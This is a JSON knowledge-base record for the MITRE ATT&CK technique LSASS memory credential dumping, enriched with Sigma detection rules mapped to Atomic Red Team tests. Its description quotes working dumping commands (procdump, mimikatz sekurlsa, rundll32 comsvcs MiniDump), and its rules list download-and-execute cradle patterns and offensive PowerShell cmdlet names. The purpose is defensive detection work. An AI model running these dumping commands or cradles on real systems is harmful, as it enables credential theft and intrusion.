{
    "id": "T1003.001",
    "name": "LSASS Memory",
    "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](TA0008) using [Use Alternate Authentication Material](T1550).\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\nFor example, on the target host use procdump:\n* `procdump -ma lsass.exe lsass_dump`\nLocally, mimikatz can be run using:\n* `sekurlsa::Minidump lsassdump.dmp`\n* `sekurlsa::logonPasswords`\nBuilt-in Windows tools such as comsvcs.dll can also be used:\n* `rundll32.exe C:WindowsSystem32comsvcs.dll MiniDump PID  lsass.dmp full`(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: `HKLMSYSTEMCurrentControlSetControlLsaSecurity Packages` and `HKLMSYSTEMCurrentControlSetControlLsaOSConfigSecurity Packages`. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\nThe following SSPs can be used to access credentials:\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)",
    "platforms": "Windows",
    "kill_chain_phases": "Credential Access",
    "data_sources": "Process: Process Creation, Process: Process Access, Command: Command Execution, Process: OS API Execution",
    "detection": "Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](T1055) to reduce potential indicators of malicious activity.\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",
    "url": "https://attack.mitre.org/techniques/T1003/001",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1003.001",
                "atomic_attack_guid": "66fb0bc1-3c3f-47e9-a298-550ecfefacbc",
                "atomic_attack_name": "Powershell Mimikatz",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "PowerShell Download and Execution Cradles",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Suspicious Program Names",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_progname.yml",
                        "remote_content": "title: Suspicious Program Names\nid: efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6\nstatus: test\ndescription: Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-11\nmodified: 2023-03-22\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        - Image|contains:\n              - '\\CVE-202' # Update this when we reach the year 2100\n              - '\\CVE202' # Update this when we reach the year 2100\n        - Image|endswith:\n              - '\\poc.exe'\n              - '\\artifact.exe'\n              - '\\artifact64.exe'\n              - '\\artifact_protected.exe'\n              - '\\artifact32.exe'\n              - '\\artifact32big.exe'\n              - 'obfuscated.exe'\n              - 'obfusc.exe'\n              - '\\meterpreter'\n    selection_commandline:\n        CommandLine|contains:\n            - 'inject.ps1'\n            - 'Invoke-CVE'\n            - 'pupy.ps1'\n            - 'payload.ps1'\n            - 'beacon.ps1'\n            - 'PowerView.ps1'\n            - 'bypass.ps1'\n            - 'obfuscated.ps1'\n            - 'obfusc.ps1'\n            - 'obfus.ps1'\n            - 'obfs.ps1'\n            - 'evil.ps1'\n            - 'MiniDogz.ps1'\n            - '_enc.ps1'\n            - '\\shell.ps1'\n            - '\\rshell.ps1'\n            - 'revshell.ps1'\n            - '\\av.ps1'\n            - '\\av_test.ps1'\n            - 'adrecon.ps1'\n            - 'mimikatz.ps1'\n            - '\\PowerUp_'\n            - 'powerup.ps1'\n            - '\\Temp\\a.ps1'\n            - '\\Temp\\p.ps1'\n            - '\\Temp\\1.ps1'\n            - 'Hound.ps1'\n            - 'encode.ps1'\n            - 'powercat.ps1'\n    condition: 1 of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - Legitimate tools that accidentally match on the searched patterns\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious PowerShell Download and Execute Pattern",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
                        "remote_content": "title: Suspicious PowerShell Download and Execute Pattern\nid: e6c54d94-498c-4562-a37c-b469d8e9a275\nrelated:\n    - id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\n      type: derived\nstatus: test\ndescription: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nreferences:\n    - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70\n    - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-28\nmodified: 2022-03-01\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: # make sure that your backend applies the strings case-insensitive\n            - 'IEX ((New-Object Net.WebClient).DownloadString'\n            - 'IEX (New-Object Net.WebClient).DownloadString'\n            - 'IEX((New-Object Net.WebClient).DownloadString'\n            - 'IEX(New-Object Net.WebClient).DownloadString'\n            - ' -command (New-Object System.Net.WebClient).DownloadFile('\n            - ' -c (New-Object System.Net.WebClient).DownloadFile('\n    condition: selection\nfalsepositives:\n    - Software installers that pull packages from remote systems and execute them\nlevel: high\n"
                    },
                    {
                        "rule_name": "Malicious PowerShell Commandlets - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_malicious_cmdlets.yml",
                        "remote_content": "title: Malicious PowerShell Commandlets - ProcessCreation\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nrelated:\n    - id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n      type: derived\n    - id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n      type: similar\nstatus: test\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n    - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n    - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n    - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n    - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n    - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ # Invoke-TotalExec\n    - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/ # Invoke-TotalExec\n    - https://github.com/calebstewart/CVE-2021-1675 # Invoke-Nightmare\n    - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n    - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n    - https://github.com/HarmJ0y/DAMP\n    - https://github.com/samratashok/nishang\n    - https://github.com/DarkCoderSc/PowerRunAsSystem/\n    - https://github.com/besimorhino/powercat\n    - https://github.com/Kevin-Robertson/Powermad\n    - https://github.com/adrecon/ADRecon\n    - https://github.com/adrecon/AzureADRecon\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\nmodified: 2024-01-25\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1482\n    - attack.t1087\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1069\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: Please ensure alphabetical order when adding new entries\n        CommandLine|contains:\n            - 'Add-Exfiltration'\n            - 'Add-Persistence'\n            - 'Add-RegBackdoor'\n            - 'Add-RemoteRegBackdoor'\n            - 'Add-ScrnSaveBackdoor'\n            - 'Check-VM'\n            - 'ConvertTo-Rc4ByteStream'\n            - 'Decrypt-Hash'\n            - 'Disable-ADIDNSNode'\n            - 'Disable-MachineAccount'\n            - 'Do-Exfiltration'\n            - 'Enable-ADIDNSNode'\n            - 'Enable-MachineAccount'\n            - 'Enabled-DuplicateToken'\n            - 'Exploit-Jboss'\n            - 'Export-ADR'\n            - 'Export-ADRCSV'\n            - 'Export-ADRExcel'\n            - 'Export-ADRHTML'\n            - 'Export-ADRJSON'\n            - 'Export-ADRXML'\n            - 'Find-Fruit'\n            - 'Find-GPOLocation'\n            - 'Find-TrustedDocuments'\n            - 'Get-ADIDNS' # Covers: Get-ADIDNSNodeAttribute, Get-ADIDNSNodeOwner, Get-ADIDNSNodeTombstoned, Get-ADIDNSPermission, Get-ADIDNSZone\n            - 'Get-ApplicationHost'\n            - 'Get-ChromeDump'\n            - 'Get-ClipboardContents'\n            - 'Get-FoxDump'\n            - 'Get-GPPPassword'\n            - 'Get-IndexedItem'\n            - 'Get-KerberosAESKey'\n            - 'Get-Keystrokes'\n            - 'Get-LSASecret'\n            - 'Get-MachineAccountAttribute'\n            - 'Get-MachineAccountCreator'\n            - 'Get-PassHashes'\n            - 'Get-RegAlwaysInstallElevated'\n            - 'Get-RegAutoLogon'\n            - 'Get-RemoteBootKey'\n            - 'Get-RemoteCachedCredential'\n            - 'Get-RemoteLocalAccountHash'\n            - 'Get-RemoteLSAKey'\n            - 'Get-RemoteMachineAccountHash'\n            - 'Get-RemoteNLKMKey'\n            - 'Get-RickAstley'\n            - 'Get-Screenshot'\n            - 'Get-SecurityPackages'\n            - 'Get-ServiceFilePermission'\n            - 'Get-ServicePermission'\n            - 'Get-ServiceUnquoted'\n            - 'Get-SiteListPassword'\n            - 'Get-System'\n            - 'Get-TimedScreenshot'\n            - 'Get-UnattendedInstallFile'\n            - 'Get-Unconstrained'\n            - 'Get-USBKeystrokes'\n            - 'Get-VaultCredential'\n            - 'Get-VulnAutoRun'\n            - 'Get-VulnSchTask'\n            - 'Grant-ADIDNSPermission'\n            - 'Gupt-Backdoor'\n            - 'HTTP-Login'\n            - 'Install-ServiceBinary'\n            - 'Install-SSP'\n            - 'Invoke-ACLScanner'\n            - 'Invoke-ADRecon'\n            - 'Invoke-ADSBackdoor'\n            - 'Invoke-AgentSmith'\n            - 'Invoke-AllChecks'\n            - 'Invoke-ARPScan'\n            - 'Invoke-AzureHound'\n            - 'Invoke-BackdoorLNK'\n            - 'Invoke-BadPotato'\n            - 'Invoke-BetterSafetyKatz'\n            - 'Invoke-BypassUAC'\n            - 'Invoke-Carbuncle'\n            - 'Invoke-Certify'\n            - 'Invoke-ConPtyShell'\n            - 'Invoke-CredentialInjection'\n            - 'Invoke-DAFT'\n            - 'Invoke-DCSync'\n            - 'Invoke-DinvokeKatz'\n            - 'Invoke-DllInjection'\n            - 'Invoke-DNSUpdate'\n            - 'Invoke-DomainPasswordSpray'\n            - 'Invoke-DowngradeAccount'\n            - 'Invoke-EgressCheck'\n            - 'Invoke-Eyewitness'\n            - 'Invoke-FakeLogonScreen'\n            - 'Invoke-Farmer'\n            - 'Invoke-Get-RBCD-Threaded'\n            - 'Invoke-Gopher'\n            - 'Invoke-Grouper' # Also Covers Invoke-GrouperX\n            - 'Invoke-HandleKatz'\n            - 'Invoke-ImpersonatedProcess'\n            - 'Invoke-ImpersonateSystem'\n            - 'Invoke-InteractiveSystemPowerShell'\n            - 'Invoke-Internalmonologue'\n            - 'Invoke-Inveigh'\n            - 'Invoke-InveighRelay'\n            - 'Invoke-KrbRelay'\n            - 'Invoke-LdapSignCheck'\n            - 'Invoke-Lockless'\n            - 'Invoke-MalSCCM'\n            - 'Invoke-Mimikatz'\n            - 'Invoke-Mimikittenz'\n            - 'Invoke-MITM6'\n            - 'Invoke-NanoDump'\n            - 'Invoke-NetRipper'\n            - 'Invoke-Nightmare'\n            - 'Invoke-NinjaCopy'\n            - 'Invoke-OfficeScrape'\n            - 'Invoke-OxidResolver'\n            - 'Invoke-P0wnedshell'\n            - 'Invoke-Paranoia'\n            - 'Invoke-PortScan'\n            - 'Invoke-PoshRatHttp' # Also Covers Invoke-PoshRatHttps\n            - 'Invoke-PostExfil'\n            - 'Invoke-PowerDump'\n            - 'Invoke-PowerShellTCP'\n            - 'Invoke-PowerShellWMI'\n            - 'Invoke-PPLDump'\n            - 'Invoke-PsExec'\n            - 'Invoke-PSInject'\n            - 'Invoke-PsUaCme'\n            - 'Invoke-ReflectivePEInjection'\n            - 'Invoke-ReverseDNSLookup'\n            - 'Invoke-Rubeus'\n            - 'Invoke-RunAs'\n            - 'Invoke-SafetyKatz'\n            - 'Invoke-SauronEye'\n            - 'Invoke-SCShell'\n            - 'Invoke-Seatbelt'\n            - 'Invoke-ServiceAbuse'\n            - 'Invoke-ShadowSpray'\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - 'Invoke-Shellcode'\n            - 'Invoke-SMBScanner'\n            - 'Invoke-Snaffler'\n            - 'Invoke-Spoolsample'\n            - 'Invoke-SpraySinglePassword'\n            - 'Invoke-SSHCommand'\n            - 'Invoke-StandIn'\n            - 'Invoke-StickyNotesExtract'\n            - 'Invoke-SystemCommand'\n            - 'Invoke-Tasksbackdoor'\n            - 'Invoke-Tater'\n            - 'Invoke-Thunderfox'\n            - 'Invoke-ThunderStruck'\n            - 'Invoke-TokenManipulation'\n            - 'Invoke-Tokenvator'\n            - 'Invoke-TotalExec'\n            - 'Invoke-UrbanBishop'\n            - 'Invoke-UserHunter'\n            - 'Invoke-VoiceTroll'\n            - 'Invoke-Whisker'\n            - 'Invoke-WinEnum'\n            - 'Invoke-winPEAS'\n            - 'Invoke-WireTap'\n            - 'Invoke-WmiCommand'\n            - 'Invoke-WMIExec'\n            - 'Invoke-WScriptBypassUAC'\n            - 'Invoke-Zerologon'\n            - 'MailRaider'\n            - 'New-ADIDNSNode'\n            - 'New-DNSRecordArray'\n            - 'New-HoneyHash'\n            - 'New-InMemoryModule'\n            - 'New-MachineAccount'\n            - 'New-SOASerialNumberArray'\n            - 'Out-Minidump'\n            - 'Port-Scan'\n            - 'PowerBreach'\n            - 'powercat '\n            - 'PowerUp'\n            - 'PowerView'\n            - 'Remove-ADIDNSNode'\n            - 'Remove-MachineAccount'\n            - 'Remove-Update'\n            - 'Rename-ADIDNSNode'\n            - 'Revoke-ADIDNSPermission'\n            - 'Set-ADIDNSNode' # Covers: Set-ADIDNSNodeAttribute, Set-ADIDNSNodeOwner\n            - 'Set-MacAttribute'\n            - 'Set-MachineAccountAttribute'\n            - 'Set-Wallpaper'\n            - 'Show-TargetScreen'\n            - 'Start-CaptureServer'\n            - 'Start-Dnscat2'\n            - 'Start-WebcamRecorder'\n            - 'VolumeShadowCopyTools'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    },
                    {
                        "rule_name": "HackTool - Mimikatz Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    },
                    {
                        "rule_name": "PowerShell Web Download",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PowerShell Download Pattern",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Any Powershell DownloadString",
                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1003.001",
                "atomic_attack_guid": "eb5adf16-b601-4926-bca7-dad22adffb37",
                "atomic_attack_name": "Dump LSASS.exe Memory through Silent Process Exit",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Use Short Name Path in Command Line",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntfs_short_name_path_use_cli.yml",
                        "remote_content": "title: Use Short Name Path in Command Line\nid: 349d891d-fef0-4fe4-bc53-eee623a15969\nrelated:\n    - id: a96970af-f126-420d-90e1-d37bf25e50e1\n      type: similar\nstatus: test\ndescription: Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection\nreferences:\n    - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)\n    - https://twitter.com/frack113/status/1555830623633375232\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-07\nmodified: 2022-10-26\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '~1\\'\n            - '~2\\'\n    filter:\n        - ParentImage:\n              - 'C:\\Windows\\System32\\Dism.exe'\n              - 'C:\\Windows\\System32\\cleanmgr.exe'\n              - 'C:\\Program Files\\GPSoftware\\Directory Opus\\dopus.exe'\n        - ParentImage|endswith:\n              - '\\WebEx\\WebexHost.exe'\n              - '\\thor\\thor64.exe'\n              - '\\veam.backup.shell.exe'\n              - '\\winget.exe'\n              - '\\Everything\\Everything.exe'\n        - ParentImage|contains: '\\AppData\\Local\\Temp\\WinGet\\'\n        - CommandLine|contains:\n              - '\\appdata\\local\\webex\\webex64\\meetings\\wbxreport.exe'\n              - 'C:\\Program Files\\Git\\post-install.bat'\n              - 'C:\\Program Files\\Git\\cmd\\scalar.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Applications could use this notation occasionally which might generate some false positives. In that case investigate the parent and child process.\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1003.001",
                "atomic_attack_guid": "86fc3f40-237f-4701-b155-81c01c48d697",
                "atomic_attack_name": "Dump LSASS.exe using imported Microsoft DLLs",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "HackTool - XORDump Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_xordump.yml",
                        "remote_content": "title: HackTool - XORDump Execution\nid: 66e563f9-1cbd-4a22-a957-d8b7c0f44372\nstatus: test\ndescription: Detects suspicious use of XORDump process memory dumping utility\nreferences:\n    - https://github.com/audibleblink/xordump\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-28\nmodified: 2023-02-08\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\xordump.exe'\n        - CommandLine|contains:\n              - ' -process lsass.exe '\n              - ' -m comsvcs '\n              - ' -m dbghelp '\n              - ' -m dbgcore '\n    condition: selection\nfalsepositives:\n    - Another tool that uses the command line switches of XORdump\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious Script Execution From Temp Folder",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_script_exec_from_temp.yml",
